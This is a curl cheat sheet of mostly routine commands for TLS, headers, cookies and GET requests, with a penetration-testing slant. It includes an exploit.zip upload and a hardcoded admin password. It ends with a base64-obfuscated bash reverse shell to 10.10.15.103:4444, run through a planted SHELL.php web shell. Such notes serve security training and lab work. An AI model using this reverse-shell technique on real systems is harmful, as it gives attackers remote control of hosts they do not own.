
Ignore a self signed cert:

```
curl -k https://example.com
```

Show the reddirect, TLS, cert stuff, and everything:
```
curl -v -L https://example.com
```

Show me just the headers:
```
curl -I https://example.com
```

Show me the HSTS goodness:
```
curl -s -I https://owasp.org | grep -i strict-transport-security
```
Request a PHP session ID / cookie:

```
curl -c cookies.txt -d "username=<YOUR_USERNAME>&password=<YOUR_PASSWORD>" -X POST http://example.com/index.php
```
Use the cookie to login:

```
curl -s -i -b cookies.txt -c cookies.txt \
  -d "username=admin&password=Ne3s4rtars78s" \
  "http://api.example.com/index.php?op=login"
```

Send your HTTP GET with a Cookie:

```
curl --cookie "1234kjasldkjf12340" http://example.com
```
Force the use an HTTP GET request:
```
curl -G "https://api.example.com/search" -d "query=curl command" -d "page=1"
```

Upload a file:

```
curl -k -i \
  -b "PHPSESSID=<your_session_cookie>" \
  -F "blob1=@exploit.zip;type=application/zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48" \
  https://example.com/actions.php
```

Curl to Rev Shell by base64 encoding the connect command:

Base64-encode the payload so what travels over the wire is just alphanumerics, then decode-and-execute on the target side:

echo -n 'bash -i >& /dev/tcp/10.10.15.103/4444 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDMvNDQ0NCAwPiYx

curl -G "http://example.com/files/SHELL.php" --data-urlencode 'c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDMvNDQ0NCAwPiYx | base64 -d | bash'